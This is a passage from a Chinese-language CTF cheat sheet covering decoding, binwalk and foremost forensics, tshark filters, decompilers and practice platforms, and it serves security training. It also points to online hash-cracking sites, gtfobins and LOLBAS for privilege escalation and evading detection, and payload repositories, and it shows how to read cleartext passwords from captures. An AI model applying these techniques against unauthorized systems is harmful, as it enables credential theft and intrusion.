3. 猜 XOR 密钥：XOR Brute Force 设 key 长度 1 至 2 字节。
4. 压缩数据：先解外层编码再 Gunzip。

> [!tip] 密文先试 Magic，识别不出再手动试 Base64、Hex、URL、ROT、XOR 五种最常见编码。

### [strings-binwalk] 文件取证与隐写工具 | easy | strings;binwalk;foremost;stego | strings;binwalk;foremost
> 二进制与文件取证三件套：strings 看内容、binwalk 找内嵌、foremost 提取，处理图片固件流量包必备。

```bash
# strings：提取可打印字符串
strings file.bin
strings -n 6 file.bin                  # 至少 6 字符
strings -e l file.bin                  # UTF-16LE（Windows 程序常用）
strings file.bin | grep -iE 'flag|key|password'

# binwalk：扫描并提取内嵌文件
binwalk file.bin                       # 扫描文件结构
binwalk -e file.bin                    # 自动提取
binwalk -D 'png:png' file.bin          # 按类型提取
binwalk --dd='.*' file.bin             # 提取全部

# foremost：按文件头提取
foremost -i file.bin -o outdir
foremost -v -i file.bin -o outdir      # 详细模式
```

> [!tip] 图片隐写套路：先 strings 找明文 flag，再 binwalk -e 找内嵌压缩包，最后看文件末尾是否追加了内容。

> [!warn] binwalk -e 可能解出多层目录，配合 `find outdir -type f` 逐一查看；foremost 结果按类型分目录存放。

### [wireshark] Wireshark 与 tshark 过滤语法 | medium | wireshark;tshark;pcap | wireshark;抓包分析
> 流量包分析核心技能，过滤语法在 Wireshark 顶部过滤栏与 tshark -Y 参数两处通用。

常用显示过滤器：

| 过滤器 | 含义 |
|---|---|
| http | HTTP 流量 |
| tcp.port == 80 | 指定端口 |
| ip.addr == 1.2.3.4 | 指定 IP |
| ip.src / ip.dst | 源 / 目的 IP |
| http.request.method == POST | POST 请求 |
| http.host contains "admin" | 域名包含关键字 |
| dns.qry.name contains "flag" | DNS 查询含关键字 |
| tcp.flags.syn == 1 | SYN 包 |
| tcp.stream eq 12 | 追踪指定 TCP 流 |
| ftp / telnet | 明文协议直接看内容 |
| frame contains "password" | 载荷包含关键字 |

tshark 命令行：

```bash
tshark -r cap.pcap -Y "http"                                          # 过滤查看
tshark -r cap.pcap -Y "http.request.method==POST" -T fields -e http.host -e http.request.uri
tshark -r cap.pcap -Y "dns" -T fields -e dns.qry.name | sort -u       # DNS 域名去重
tshark -r cap.pcap -z conv,tcp                                        # TCP 会话统计
tshark -r cap.pcap -c 100                                             # 只看前 100 包
tshark -r cap.pcap -w out.pcap -Y "http"                              # 过滤后另存
```

> [!tip] 抓 HTTP 登录包直接 Follow TCP Stream 看明文口令；找攻击行为按 ip.addr 加 http 组合过滤，或直接搜 flag、passwd、key 关键字。

> [!warn] 大 pcap 先用 `tshark -z io,stat` 或会话统计缩小范围，不要直接全量 Follow。

## [g-res] 在线与资源——解码站、反编译、CTF 平台
### [online-decode] 在线解码与转换工具 | easy | decode;online;tool | 解码站;在线工具
> 解码需求在线解决，收藏几个全能的就够，避免本地装一堆脚本。

| 站点 | 用途 |
|---|---|
| dcode.fr | 解码大全，几百种编码、加密与谜题工具 |
| CyberChef（gchq.github.io/CyberChef） | 可视化编解码瑞士军刀 |
| cmd5.com / somd5.com | MD5、SHA 彩虹表在线查询 |
| crackstation.net | 哈希在线破解（字典） |
| 站长工具（tool.chinaz.com） | Base64、URL、时间戳等日常转换 |
| zxing 在线二维码 | 二维码解码 |
| 时间戳转换 | tool.lu/timestamp 等 |
| 图片 EXIF | 图片详情查看工具 |

> [!tip] 密文识别顺序：Magic 到 dcode.fr 识别页到哈希查表，前两步覆盖 CTF 九成解码题。

### [decompile-tools] 反编译与逆向工具清单 | medium | decompile;reverse;jadx;ghidra | 反编译;逆向
> 按语言选工具：Java 用 jadx，Python 用 uncompyle6，通用二进制用 Ghidra，一套覆盖 CTF 与实战。

| 目标 | 工具 | 一句话用法 |
|---|---|---|
| APK | jadx | `jadx -d out app.apk` 直接出 Java 源码 |
| Java jar/class | jd-gui / CFR | 打开即反编译 |
| .NET | dnSpy / ILSpy | 打开 exe/dll 即反编译 |
| Python pyc | uncompyle6 / pycdc / decompyle3 | `uncompyle6 file.pyc > out.py` |
| 通用二进制 | Ghidra / IDA / radare2 | 静态反汇编与反编译 |
| 固件内核 | Ghidra 加 binwalk | 先 binwalk 拆再 Ghidra 分析 |
| 在线反编译 | javadecompilers.com | 传文件在线出结果 |
| 动态调试 | gdb / x64dbg / Frida | 运行时分析 |

> [!tip] 逆向题先 strings 找线索再定语言选工具；遇到加密逻辑就在反编译结果里搜密钥常量。

> [!warn] 反编译产物仅供参考，混淆与优化代码会失真，关键逻辑要结合动态调试验证。

### [ctf-platforms] CTF 平台与资源站 | easy | ctf;platform;resource | CTF平台;资源
> 平台刷题、靶场练手、仓库查 payload，三个方向各收藏一两个就够用。

| 方向 | 名称 | 说明 |
|---|---|---|
| 刷题 | BUUCTF（buuoj.cn） | 国内聚合题，题型全有环境 |
| 刷题 | 攻防世界 XCTF | 入门题友好 |
| 刷题 | CTFshow | 按方向分门别类 |
| 靶场 | DVWA / Pikachu / SQLi-Labs | 本地练 Web 漏洞 |
| 靶场 | Upload-Labs | 文件上传专项 |
| 靶场 | HackTheBox / TryHackMe / Vulnhub | 海外实战靶机 |
| Payload | PayloadsAllTheThings | 全漏洞类型 payload 仓库 |
| Payload | gtfobins / LOLBAS | 提权与绕检测技巧 |
| 漏洞库 | exploit-db / NVD / CNVD | 漏洞与 exp 查询 |
| 字典 | SecLists | 目录、口令、用户名大全 |

> [!tip] 新手路径：DVWA 本地过一遍经典漏洞，BUUCTF 刷简单题，实战按需查 PayloadsAllTheThings。

> [!warn] 遵守平台规则，Vulnhub 靶机属授权环境，不要拿公共靶场做未授权扫描。
